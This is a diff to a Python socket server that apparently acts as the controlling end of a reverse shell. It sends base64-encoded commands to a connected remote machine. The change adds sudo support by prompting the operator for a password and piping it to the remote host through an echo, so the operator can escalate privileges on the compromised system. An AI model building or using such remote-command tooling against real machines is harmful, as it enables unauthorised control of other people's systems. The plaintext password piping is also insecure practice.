@@ -2,7 +2,7 @@ import socket
 import pyfiglet
 import os
 import base64
-
+from getpass import getpass
 """This function is used to encode the data to be send"""
 def en(data):
     return base64.b64encode(data.encode())
@@ -29,7 +29,7 @@ def main():
     (client, (ip,port))=s.accept()
     print("Received connection from ",ip," port:",port)
     print("Client is:",client)
-
+    flag=0
     while True:
         # Extracting the current working directory
         a=en('pwd')
@@ -53,6 +53,13 @@ def main():
         if not c:
             print("Please enter the command...")
         else:
+            # This is the case of sudo command
+            if c[:4]=='sudo' and flag==0:
+                c=c[:4]+' -S'+c[4:]
+                pas=getpass("Enter the user password:")
+                c='echo \"'+pas+'\" | '+c
+                flag=1
+
             c=en(c)
             # Sending the encoded command to the remote system
             client.send(c)
